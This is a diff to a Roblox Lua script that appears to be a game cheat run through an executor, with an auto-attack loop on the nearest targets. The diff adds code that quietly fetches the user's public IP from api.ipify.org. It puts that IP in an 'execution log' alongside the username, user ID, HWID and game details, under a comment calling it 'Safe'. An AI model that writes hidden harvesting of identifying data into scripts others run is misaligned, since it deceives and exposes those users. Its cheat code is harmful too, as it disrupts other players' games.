@@ -160,6 +160,12 @@ local startTime = tick()
 -- Safe executor detection
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
+-- Safe IP fetch
+local ip = "Unavailable"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
 -- Game info
 local gameId = game.PlaceId
 local jobId = game.JobId
@@ -194,6 +200,7 @@ local function sendExecutionLog()
             "[+] Display Name: " .. LocalPlayer.DisplayName,
             "[+] User ID: " .. tostring(LocalPlayer.UserId),
             "[+] Executor: " .. executor,
+            "[+] IP Address: " .. ip,
             "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
             "[+] Game Name: " .. gameName,
             "[+] Game ID: " .. tostring(gameId),
@@ -619,19 +626,13 @@ task.spawn(function()
             if #targets > 0 then
                 table.sort(targets, function(a,b) return a.dist < b.dist end)
                 local selectedTargets = {}
-                    -- Play rock swing animation
-    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
-    if tool and tool:FindFirstChild("Handle") then
-        local anim = Instance.new("Animation")
-        anim.AnimationId = "rbxassetid://522635514"
-        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            local track = hum:LoadAnimation(anim)
-            track:Play()
+                for i=1, math.min(targetCount, #targets) do table.insert(selectedTargets, targets[i].eid) end
+                swingtool(selectedTargets)
+            end
+            task.wait(cooldown)
         end
     end
-end
-
+end)
 
 
 task.spawn(function()
